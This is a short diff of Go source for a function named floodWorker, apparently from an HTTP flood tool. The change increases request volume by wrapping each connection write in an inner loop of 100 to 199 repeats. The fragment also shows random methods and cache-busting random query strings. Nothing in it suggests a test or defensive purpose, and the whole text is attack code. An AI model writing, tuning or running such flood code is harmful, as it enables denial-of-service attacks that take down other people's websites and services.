@@ -112,13 +112,15 @@ func floodWorker(id int, stop <-chan struct{}) {
 				continue
 			}
 
-			for i := 0; i < rand.Intn(100)+100; i++ { // 50-100 requests/connection
+			for i := 0; i < rand.Intn(50)+50; i++ { // 50-100 requests/connection
 				method := httpMethods[rand.Intn(len(httpMethods))]
 				reqPath := path
 				if rand.Intn(2) == 0 {
 					reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
 				}
-				conn.Write(buildRequest(method, reqPath))
+				for i := 0; i < rand.Intn(100)+100; i++ {
+					conn.Write(buildRequest(method, reqPath))
+				}
 				time.Sleep(time.Millisecond * time.Duration(rand.Intn(15)))
 			}
 			conn.Close()
